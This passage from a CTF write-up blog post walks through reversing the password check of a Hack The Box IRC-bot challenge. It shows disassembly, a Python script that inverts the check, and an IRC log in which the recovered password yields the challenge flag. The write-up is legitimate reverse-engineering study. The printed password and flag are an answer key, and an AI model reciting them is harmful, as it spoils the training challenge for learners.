        0040040b 74 31           JZ         LAB_0040043e
        0040040d 3c 0d           CMP        AL,0xd
        0040040f 74 2d           JZ         LAB_0040043e
        00400411 48 3b 15        CMP        RDX,qword ptr [DAT_00601159]                     = 08h
                 41 0d 20 00
        00400418 77 4c           JA         LAB_00400466
        0040041a 3c 41           CMP        AL,0x41
        0040041c 72 0e           JC         LAB_0040042c
        0040041e 3c 5a           CMP        AL,0x5a
        00400420 77 0a           JA         LAB_0040042c
        00400422 04 11           ADD        AL,0x11
        00400424 3c 5a           CMP        AL,0x5a
        00400426 76 04           JBE        LAB_0040042c
        00400428 2c 5a           SUB        AL,0x5a
        0040042a 04 40           ADD        AL,0x40
                             LAB_0040042c                                    XREF[3]:     0040041c(j), 00400420(j), 
                                                                                          00400426(j)  
        0040042c 38 07           CMP        byte ptr [RDI]=&gt;s_RJJ3DSCP_00601150,AL           = &quot;RJJ3DSCP&quot;
        0040042e 75 36           JNZ        LAB_00400466
        00400430 48 ff c2        INC        RDX
        00400433 48 ff c3        INC        RBX
        00400436 48 ff c6        INC        RSI
        00400439 48 ff c7        INC        RDI
        0040043c eb c3           JMP        LAB_00400401
                             LAB_0040043e                                    XREF[3]:     00400407(j), 0040040b(j), 
                                                                                          0040040f(j)  
        0040043e 48 89 ce        MOV        RSI,RCX
        00400441 48 3b 15        CMP        RDX,qword ptr [DAT_00601159]                     = 08h
                 11 0d 20 00
        00400448 75 1c           JNZ        LAB_00400466
        0040044a 48 ff 05        INC        qword ptr [DAT_00601008]
                 b7 0b 20 00
        00400451 48 8d 35        LEA        RSI,[s_Accepted_00601092]                        = &quot;Accepted&quot;
                 3a 0c 20 00
        00400458 48 8b 0d        MOV        RCX,qword ptr [DAT_0060109b]                     = 0000000000000009h
                 3c 0c 20 00
        0040045f e8 21 00        CALL       FUN_00400485                                     undefined FUN_00400485()
                 00 00
        00400464 eb 1e           JMP        LAB_00400484
                             LAB_00400466                                    XREF[3]:     00400418(j), 0040042e(j), 
                                                                                          00400448(j)  
        00400466 48 c7 05        MOV        qword ptr [DAT_00601008],0x0
                 97 0b 20 
                 00 00 00 
        00400471 48 8d 35        LEA        RSI,[s_Rejected_006010a3]                        = &quot;Rejected&quot;
                 2b 0c 20 00
        00400478 48 8b 0d        MOV        RCX,qword ptr [DAT_006010ac]                     = 0000000000000009h
                 2d 0c 20 00
        0040047f e8 01 00        CALL       FUN_00400485                                     undefined FUN_00400485()
                 00 00
</span></code></pre>
<p>So the core flow of this segment of assembly is a fancy string comparison.  It loads the byte it is currently operating on (so 0th, 1st, 2nd, until it goes through 8 of them), mutates it based on a condition, and then compares it against <code>RJJ3DSCP</code>.  I will put these mutations in the form of a python script because that's how I solved it and I don't want to explain it with english lol.</p>
<pre style="background-color:#212733;">
<code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">string </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">printable

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">mutate</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">c</span><span style="color:#ccc9c2;">):
	</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">c </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x41</span><span style="color:#ccc9c2;">:
		</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">c
	</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">c </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0x5a</span><span style="color:#ccc9c2;">:
		</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">c
	c </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">0x11
	</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">c </span><span style="color:#f29e74;">&lt;= </span><span style="color:#ffcc66;">0x5a</span><span style="color:#ccc9c2;">:
		</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">c
	c </span><span style="color:#f29e74;">-= </span><span style="color:#ffcc66;">0x5a
	</span><span style="color:#ccc9c2;">c </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">0x40
	</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">c

comp </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;RJJ3DSCP&quot;

</span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2;">):
	</span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">j </span><span style="color:#ffa759;">in </span><span style="color:#ccc9c2;">printable:
		</span><span style="color:#ffa759;">if </span><span style="color:#f28779;">chr</span><span style="color:#ccc9c2;">(</span><span style="color:#ffd580;">mutate</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">ord</span><span style="color:#ccc9c2;">(j))) </span><span style="color:#f29e74;">== </span><span style="color:#ccc9c2;">comp[i]:
			</span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(j</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">end</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;&#39;</span><span style="color:#ccc9c2;">)
</span></code></pre>
<p>That script solves for ASS3MBLY which definitely looks meaningful.  Let's try telling it to the bot!</p>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">* Now talking on #secret
* #secret :No topic is set
* ircware_7040 (ircware@127.0.0.1) has joined
&lt;sky&gt; @pass ASS3MBLY
&lt;ircware_7040&gt; Accepted
&lt;sky&gt; @flag
&lt;ircware_7040&gt; HTB{m1N1m411st1C_fL4g_pR0v1d3r_b0T}
</span></code></pre>
    </div>

    
    <div class="article-info">
        
        <div class="article-date">10 December 2020</div>
        
        <div class="article-taxonomies">
            
            
                <ul class="article-tags">
                    
                    <li><a href="https://heinen.dev/tags/ctf-writeups/">#ctf-writeups</a></li>
                    
                </ul>
            
        </div>
    </div>

</article>


        </main>
        <footer>
            
            
        </footer>
    </div>
    <!-- Cloudflare Web Analytics -->
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
    <!-- End Cloudflare Web Analytics -->
</body>
</html>
